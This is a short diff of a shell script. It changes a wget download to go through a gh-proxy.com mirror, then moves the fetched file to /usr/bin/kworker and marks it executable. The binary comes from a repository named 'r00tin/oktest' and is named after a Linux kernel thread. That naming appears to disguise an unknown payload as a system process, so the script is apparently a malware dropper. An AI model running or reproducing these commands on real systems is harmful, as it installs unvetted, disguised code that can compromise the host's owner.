@@ -1,4 +1,4 @@
-wget https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker /usr/bin/kworker
+wget https://gh-proxy.com/raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker /usr/bin/kworker
 mv kworker /usr/bin/kworker
 chmod +x /usr/bin/kworker
 
